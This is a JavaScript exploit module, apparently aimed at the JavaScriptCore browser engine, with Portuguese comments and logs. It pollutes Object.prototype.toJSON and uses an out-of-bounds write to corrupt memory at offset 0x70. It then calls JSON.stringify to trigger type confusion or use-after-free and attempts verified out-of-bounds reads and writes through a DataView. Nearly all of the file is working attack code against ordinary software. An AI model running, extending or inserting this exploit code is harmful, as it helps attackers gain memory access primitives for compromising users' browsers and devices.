// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const EXPLOIT_TC_PARAMS = {
    victim_ab_original_size: 64, // Tamanho com que victim_ab é criado
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write_for_corruption: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "ExploitTypeConfusion_0x70_FFFF"
};

export let callCount_toJSON_exploit_tc = 0;
let victim_ab_for_this_context_ref = null; // Para comparar 'this'

// toJSON Modificada para explorar 'this' como ArrayBuffer se a Type Confusion ocorrer
export function toJSON_ExploitTypeConfusion() {
    const FNAME_toJSON_local = `toJSON_ExploitTC(Call ${++callCount_toJSON_exploit_tc})`;
    document.title = `toJSON_ExploitTC Call ${callCount_toJSON_exploit_tc}`;

    const currentOperationThis = this;
    logS3(`[${EXPLOIT_TC_PARAMS.ppKey} Poluído - Exploit TC] ${FNAME_toJSON_local} Chamado!`, "vuln");
    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info");

    let tc_details = {
        this_is_victim_ab: "Não verificado",
        observed_byteLength: "N/A",
        dataview_created: false,
        oob_read_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 16, // Tentar ler 16 bytes além do original
        oob_read_value: "N/A",
        oob_write_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 32, // Tentar escrever 32 bytes além
        oob_write_success: false
    };

    try {
        // Verifica se 'this' é o nosso victim_ab de referência
        if (victim_ab_for_this_context_ref && currentOperationThis === victim_ab_for_this_context_ref) {
            tc_details.this_is_victim_ab = "SIM (currentOperationThis === victim_ab_for_this_context_ref)";
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] CONFIRMADO: 'this' é victim_ab_for_this_context_ref! Tentando explorar...`, "critical");
        } else if (currentOperationThis instanceof ArrayBuffer) {
            tc_details.this_is_victim_ab = `POTENCIAL (this instanceof ArrayBuffer, byteLength: ${currentOperationThis.byteLength})`;
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] 'this' é um ArrayBuffer. Tentando explorar...`, "vuln");
        } else {
            tc_details.this_is_victim_ab = "NÃO (não é ArrayBuffer ou não é a referência esperada)";
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] 'this' não é o ArrayBuffer vítima esperado. Tipo: ${typeof currentOperationThis}`, "warn");
            return { toJSON_TC_exploit_this_mismatch: true, call: callCount_toJSON_exploit_tc, details: tc_details };
        }

        tc_details.observed_byteLength = currentOperationThis.byteLength;
        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] this.byteLength (do 'this' confuso): ${tc_details.observed_byteLength}`, "leak");

        if (typeof tc_details.observed_byteLength === 'number') {
            if (tc_details.observed_byteLength > EXPLOIT_TC_PARAMS.victim_ab_original_size) {
                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] !!! SUCESSO UAF/TC PARCIAL !!! this.byteLength (${tc_details.observed_byteLength}) > original (${EXPLOIT_TC_PARAMS.victim_ab_original_size})`, "critical");
                document.title = `TC Exploit: byteLength=${tc_details.observed_byteLength}`;
            }

            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Tentando criar DataView sobre 'this' (tamanho ${tc_details.observed_byteLength})...`, "info");
            try {
                let confused_dv = new DataView(currentOperationThis); // Usa o 'this' (ArrayBuffer confuso) diretamente
                tc_details.dataview_created = true;
                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] DataView criada sobre 'this' com tamanho ${confused_dv.byteLength}.`, "good");

                // Tentar leitura OOB (relativo ao victim_ab, se o tamanho foi corrompido para maior)
                if (confused_dv.byteLength > tc_details.oob_read_attempt_offset + 3) {
                    tc_details.oob_read_value = confused_dv.getUint32(tc_details.oob_read_attempt_offset, true);
                    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] LEITURA OOB de 'this' @ ${toHex(tc_details.oob_read_attempt_offset)}: ${toHex(tc_details.oob_read_value)}`, "leak");
                    document.title = `TC Exploit: OOB Read OK @${toHex(tc_details.oob_read_attempt_offset)}=${toHex(tc_details.oob_read_value)}`;
                } else {
                    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Tamanho da DataView confusa (${confused_dv.byteLength}) não permite leitura em ${toHex(tc_details.oob_read_attempt_offset)}.`, "info");
                }

                // Tentar escrita OOB
                if (confused_dv.byteLength > tc_details.oob_write_attempt_offset + 3) {
                    const test_write_val = 0xCAFEBABE;
                    confused_dv.setUint32(tc_details.oob_write_attempt_offset, test_write_val, true);
                    let readback = confused_dv.getUint32(tc_details.oob_write_attempt_offset, true);
                    if (readback === test_write_val) {
                        tc_details.oob_write_success = true;
                        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ESCRITA OOB em 'this' @ ${toHex(tc_details.oob_write_attempt_offset)} VERIFICADA!`, "critical");
                        document.title = "TC Exploit: OOB WRITE SUCCESS!";
                    } else {
                        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Falha na verificação da escrita OOB em 'this' @ ${toHex(tc_details.oob_write_attempt_offset)}. Leu ${toHex(readback)}`, "error");
                    }
                }
            } catch (e_dv_confused) {
                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ERRO ao criar/usar DataView em 'this': ${e_dv_confused.message}`, "error");
                tc_details.dataview_created = `Erro DV: ${e_dv_confused.message}`;
                document.title = "TC Exploit: ERRO DataView em 'this'";
            }
        } else {
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] this.byteLength não é numérico. Não tentando DataView.`, "warn");
        }
        // Retornar algo simples para evitar recursão excessiva se a exploração não for imediata
        return { toJSON_TC_exploit_attempted: true, call: callCount_toJSON_exploit_tc, details: tc_details };
    } catch (e_main_toJSON) {
        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ERRO GERAL em toJSON_ExploitTypeConfusion: ${e_main_toJSON.message}`, "critical");
        document.title = `ERRO GERAL toJSON Call ${callCount_toJSON_exploit_tc}`;
        // Lançar para ser pego pelo catch em torno do JSON.stringify
        throw new Error(`Erro Geral em toJSON_ExploitTypeConfusion Call ${callCount_toJSON_exploit_tc}: ${e_main_toJSON.message}`);
    }
}

export async function executeTypeConfusionExploitAttempt() {
    const FNAME_TEST_RUNNER = EXPLOIT_TC_PARAMS.description;
    logS3(`--- Iniciando ${FNAME_TEST_RUNNER} ---`, "test", FNAME_TEST_RUNNER);
    document.title = `Iniciando ${FNAME_TEST_RUNNER}`;

    callCount_toJSON_exploit_tc = 0;
    victim_ab_for_this_context_ref = null; // Resetar referência

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST_RUNNER);
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = `OOB OK - ${FNAME_TEST_RUNNER}`;

    victim_ab_for_this_context_ref = new ArrayBuffer(EXPLOIT_TC_PARAMS.victim_ab_original_size);
    logS3(`victim_ab_for_this_context_ref (${EXPLOIT_TC_PARAMS.victim_ab_original_size}b) criado.`, "info", FNAME_TEST_RUNNER);

    let object_to_stringify = { simple_prop: "trigger_TypeConfusion_toJSON" };
    logS3(`object_to_stringify criado: ${JSON.stringify(object_to_stringify)}`, "info", FNAME_TEST_RUNNER);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, EXPLOIT_TC_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${EXPLOIT_TC_PARAMS.ppKey} com toJSON_ExploitTypeConfusion...`, "info", FNAME_TEST_RUNNER);
        document.title = `Aplicando PP Exploit TC - ${FNAME_TEST_RUNNER}`;
        Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, {
            value: toJSON_ExploitTypeConfusion,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com toJSON_ExploitTypeConfusion.`, "good", FNAME_TEST_RUNNER);
        stepReached = "pp_aplicada";
        document.title = `PP Exploit TC OK - ${FNAME_TEST_RUNNER}`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(EXPLOIT_TC_PARAMS.value_to_write_for_corruption)} @ ${toHex(EXPLOIT_TC_PARAMS.corruption_offset)}`, "warn", FNAME_TEST_RUNNER);
        document.title = `Antes OOB Write Exploit TC - ${FNAME_TEST_RUNNER}`;
        oob_write_absolute(EXPLOIT_TC_PARAMS.corruption_offset, EXPLOIT_TC_PARAMS.value_to_write_for_corruption, EXPLOIT_TC_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME_TEST_RUNNER);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write Exploit TC - ${FNAME_TEST_RUNNER}`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_obj_simples";
        document.title = `Antes Strfy Obj Simples - ${FNAME_TEST_RUNNER}`;
        logS3(`Chamando JSON.stringify(object_to_stringify) (esperando que 'this' na toJSON seja victim_ab_for_this_context_ref)...`, "info", FNAME_TEST_RUNNER);
        
        try {
            stringifyResult = JSON.stringify(object_to_stringify);
            stepReached = `apos_stringify_obj_simples`;
            potentiallyCrashed = false;
            document.title = `Strfy Obj Simples OK - ${FNAME_TEST_RUNNER}`;
            logS3(`Resultado JSON.stringify(object_to_stringify): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "info", FNAME_TEST_RUNNER);
        } catch (e) {
            stepReached = `erro_stringify_obj_simples`;
            potentiallyCrashed = false;
            errorCaptured = e;
            document.title = `ERRO Strfy Obj Simples (${e.name}) - ${FNAME_TEST_RUNNER}`;
            logS3(`ERRO CAPTURADO JSON.stringify(object_to_stringify): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "critical", FNAME_TEST_RUNNER);
            console.error(`JSON.stringify ERROR for object_to_stringify (Exploit TC):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME_TEST_RUNNER);
        document.title = "ERRO Principal Exploit TC - " + FNAME_TEST_RUNNER;
        console.error("Main TC exploit test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[EXPLOIT_TC_PARAMS.ppKey];
        }
        victim_ab_for_this_context_ref = null; // Limpar referência
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME_TEST_RUNNER);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME_TEST_RUNNER}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_toJSON_exploit_tc}`, "error", FNAME_TEST_RUNNER);
        }
    }
    logS3(`--- Tentativa de Exploração de Type Confusion Concluída: ${FNAME_TEST_RUNNER} (Chamadas toJSON: ${callCount_toJSON_exploit_tc}) ---`, "test", FNAME_TEST_RUNNER);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Exploit TC OK - ${FNAME_TEST_RUNNER}`;
    } else if (errorCaptured) {
        // Título já reflete erro
    }
    return { potentiallyFroze: potentiallyCrashed, errorOccurred: errorCaptured, calls: callCount_toJSON_exploit_tc, stringifyResult };
}
